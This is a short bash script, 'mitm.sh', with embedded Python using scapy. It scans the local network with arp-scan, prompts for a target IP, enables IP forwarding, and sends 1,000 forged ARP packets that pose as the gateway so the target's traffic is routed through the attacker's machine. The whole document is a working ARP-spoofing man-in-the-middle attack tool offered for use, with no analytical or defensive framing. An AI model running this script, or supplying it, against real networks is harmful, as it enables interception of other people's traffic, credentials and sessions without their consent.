#!/bin/bash
echo "mitm.sh v.1"

IFACE=eth0
if [ "$EUID" != 0 ]
	then echo "Program must be runned as root"
	exit
fi

echo "Scanning network."

line_del(){
	printf "\033[1A" #move cursor one line up
	printf "\033[K" #delete until end of line

}
bName=$(hostname -I)
nName=${bName%.*}
bName="${nName}.255"
ping $bName -b -w1 > /dev/null
gName="${nName}.1"
read eName </sys/class/net/$IFACE/address

arp-scan --localnet | grep -oP '^[\d.]+' >> ip.txt
head -n -1 ip.txt > temp.txt ; mv temp.txt ip.txt
line_del
line_del
echo "scanning network.."
sleep 1
line_del
echo "scanning network..."
sleep 1
echo "done!"
cat -n ip.txt

echo "Enter Target: "
read vic
vic="${vic}p"
vic=$(sed -n $vic ip.txt)
echo "Targeting "$vic
rm ip.txt

python3 <<END_OF_PYTHON
#!/usr/bin/env python3

import scapy.all as scapy
import os

vic = "$vic"
gName = "$gName"
eName = "$eName"
run = True

print('[*]turning ip_forwarding on...')
os.system('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')
if run:
    print("[*]Setting Addresses...")
    a = scapy.ARP()
    a.pdst = str(vic)
    a.hwsrc = str(eName)
    a.psrc = str(gName)
    a.hwdst = "ff:ff:ff:ff:ff:ff"
    print('[*]Starting Spoof')
    scapy.send(a, inter=1, count=int(1000))
END_OF_PYTHON

echo "done"
